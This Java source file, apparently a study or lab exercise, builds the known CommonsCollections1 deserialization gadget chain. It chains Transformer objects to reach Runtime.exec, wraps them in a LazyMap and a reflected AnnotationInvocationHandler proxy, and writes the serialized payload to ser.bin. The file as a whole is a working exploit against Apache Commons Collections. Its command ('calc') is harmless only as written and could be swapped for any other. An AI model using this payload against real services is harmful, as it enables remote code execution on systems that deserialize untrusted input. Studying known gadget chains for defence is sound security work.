package org.CC.CC1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

/**
 * Gadget chain:
 * 		ObjectInputStream.readObject()
 * 			AnnotationInvocationHandler.readObject()
 * 				Map(Proxy).entrySet()
 * 					AnnotationInvocationHandler.invoke()
 * 						LazyMap.get()
 * 							ChainedTransformer.transform()
 * 								ConstantTransformer.transform()
 * 								InvokerTransformer.transform()
 * 									Method.invoke()
 * 										Class.getMethod()
 * 								InvokerTransformer.transform()
 * 									Method.invoke()
 * 										Runtime.getRuntime()
 * 								InvokerTransformer.transform()
 * 									Method.invoke()
 * 										Runtime.exec()
 */

public class YsoCC1Test {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class}, new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{Runtime.class,null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","b");
        Map lazyMap = LazyMap.decorate(map, chainedTransformer);
        Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        declaredConstructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) declaredConstructor.newInstance(Override.class, lazyMap);
        Map mapProxy = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, handler);
        Object o = declaredConstructor.newInstance(Override.class, mapProxy);
        serialize(o);
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

}
